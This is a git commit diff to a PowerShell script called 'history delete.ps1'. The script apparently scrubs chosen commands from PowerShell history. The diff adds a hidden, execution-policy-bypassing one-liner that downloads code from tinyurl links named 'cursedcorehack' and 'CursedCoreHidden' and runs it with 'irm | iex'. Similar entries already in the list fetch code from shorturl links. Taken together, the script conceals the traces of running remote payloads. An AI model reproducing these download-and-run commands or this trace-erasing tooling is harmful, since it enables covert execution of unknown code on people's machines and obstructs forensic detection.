78bff9d1199f4e451704f31b01e1bd43622df006
CursedCore2025 <adrishbanerjee05@gmail.com>
2025-06-02 02:24:04 +0530

    Update history delete.ps1

--- history delete.ps1
+++ history delete.ps1
@@ -9,6 +9,7 @@ $blockedCommands = @(
     'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -File "C:\Users\adris\Desktop\Powershell ki Chudai\history delete.ps1"'
     'powershell -windowstyle hidden -ep bypass -c "irm https://shorturl.at/to9Mg | iex"'
     'powershell -windowstyle hidden -ep bypass -c "irm https://shorturl.at/YFedx | iex"'
+    'powershell -windowstyle hidden -ep bypass -c "irm https://tinyurl.com/cursedcorehack | iex; irm https://tinyurl.com/CursedCoreHidden | iex"'
 )
 
 if (Test-Path $historyFile) {
